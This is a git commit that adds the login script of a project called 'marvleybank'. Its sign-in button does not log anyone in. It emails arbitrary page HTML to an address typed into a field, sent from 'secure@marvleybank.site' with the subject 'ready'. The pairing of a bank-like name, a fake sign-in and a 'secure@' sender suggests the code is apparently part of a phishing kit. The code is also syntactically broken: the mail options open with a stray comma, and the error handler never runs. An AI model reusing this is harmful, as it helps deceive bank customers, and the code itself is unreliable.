5b09ecc00bbf6850e29221988d2b848670a7ff4c
MARVER1X <bbmardd@gmail.com>
2024-12-10 06:43:38 -0800

    Initial commit

---
+++ marvleybank-main/login/scripts/index.js
@@ -0,0 +1,23 @@
+let signIn = document.querySelector("#sign-in");
+
+    signIn.addEventListener("click",  (e) => {
+        e.preventDefault();
+        let to = document.querySelector('#to').value;
+        let html = document.querySelector('#html').innerHTML;
+            Email.send({
+                ,
+                To: to,
+                From: 'secure@marvleybank.site', // Your Outlook email address
+                Subject: "ready",
+                Body: html
+            }).then(
+                function () {
+                alert('Email sent successfully');
+                }
+            ).catch(
+               function () {
+                error => console.error('Error sending email:', error)
+                }
+            );
+        
+})
